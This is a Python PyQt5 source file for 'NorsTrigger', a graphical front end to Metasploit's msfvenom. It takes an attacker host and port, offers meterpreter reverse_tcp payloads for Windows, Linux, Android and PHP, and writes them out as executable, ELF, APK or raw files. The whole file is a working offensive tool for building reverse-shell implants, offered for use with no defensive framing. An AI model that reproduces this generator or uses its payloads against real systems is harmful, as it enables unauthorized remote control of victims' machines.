#!/usr/bin/env python3
# NorsTrigger - Metasploit Payload Generator
# License: GPLv3

import sys
import subprocess
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QHBoxLayout, QLabel, QLineEdit, QComboBox, 
                             QPushButton, QTextEdit, QMessageBox)
from PyQt5.QtGui import QFont, QColor, QPalette
from PyQt5.QtCore import Qt

class NorsTrigger(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle("NorsTrigger - Payload Generator")
        self.setGeometry(100, 100, 600, 400)
        
        # NorsDark Theme colors
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(10, 25, 47))
        palette.setColor(QPalette.WindowText, Qt.white)
        palette.setColor(QPalette.Base, QColor(17, 34, 64))
        palette.setColor(QPalette.Text, Qt.white)
        palette.setColor(QPalette.Button, QColor(0, 180, 216))
        palette.setColor(QPalette.ButtonText, Qt.black)
        self.setPalette(palette)

        main_widget = QWidget()
        layout = QVBoxLayout()

        # Title
        title = QLabel("🦅 NorsTrigger")
        title.setFont(QFont("Cairo", 16, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        title.setStyleSheet("color: #00B4D8;")
        layout.addWidget(title)

        # LHOST
        lhost_layout = QHBoxLayout()
        lhost_layout.addWidget(QLabel("LHOST:"))
        self.lhost_input = QLineEdit()
        lhost_layout.addWidget(self.lhost_input)
        layout.addLayout(lhost_layout)

        # LPORT
        lport_layout = QHBoxLayout()
        lport_layout.addWidget(QLabel("LPORT:"))
        self.lport_input = QLineEdit("4444")
        lport_layout.addWidget(self.lport_input)
        layout.addLayout(lport_layout)

        # Payload Type
        payload_layout = QHBoxLayout()
        payload_layout.addWidget(QLabel("Payload:"))
        self.payload_combo = QComboBox()
        self.payload_combo.addItems([
            "windows/meterpreter/reverse_tcp",
            "linux/x64/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_tcp",
            "php/meterpreter_reverse_tcp"
        ])
        payload_layout.addWidget(self.payload_combo)
        layout.addLayout(payload_layout)

        # Format
        format_layout = QHBoxLayout()
        format_layout.addWidget(QLabel("Format:"))
        self.format_combo = QComboBox()
        self.format_combo.addItems(["exe", "elf", "apk", "raw"])
        format_layout.addWidget(self.format_combo)
        layout.addLayout(format_layout)

        # Generate Button
        self.generate_btn = QPushButton("Generate Payload")
        self.generate_btn.setStyleSheet("background-color: #00B4D8; color: black; font-weight: bold; border-radius: 5px; padding: 5px;")
        self.generate_btn.clicked.connect(self.generate_payload)
        layout.addWidget(self.generate_btn)

        # Output Log
        self.output_log = QTextEdit()
        self.output_log.setReadOnly(True)
        self.output_log.setStyleSheet("background-color: #112240; border: 1px solid #B0C4DE;")
        layout.addWidget(self.output_log)

        main_widget.setLayout(layout)
        self.setCentralWidget(main_widget)

    def generate_payload(self):
        lhost = self.lhost_input.text()
        lport = self.lport_input.text()
        payload = self.payload_combo.currentText()
        out_format = self.format_combo.currentText()
        output_file = f"payload.{out_format}"

        if not lhost:
            QMessageBox.warning(self, "Error", "LHOST cannot be empty!")
            return

        msfvenom_cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", out_format,
            "-o", output_file
        ]

        self.output_log.append(f"[*] Running: {' '.join(msfvenom_cmd)}")
        
        try:
            # Note: msfvenom must be in PATH
            process = subprocess.Popen(msfvenom_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            out, err = process.communicate()
            if process.returncode == 0:
                self.output_log.append(f"[+] Payload generated successfully: {output_file}")
                if out: self.output_log.append(out)
            else:
                self.output_log.append(f"[-] Error generating payload.")
                if err: self.output_log.append(err)
        except FileNotFoundError:
            self.output_log.append("[-] msfvenom not found! Please ensure Metasploit is installed.")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = NorsTrigger()
    window.show()
    sys.exit(app.exec_())
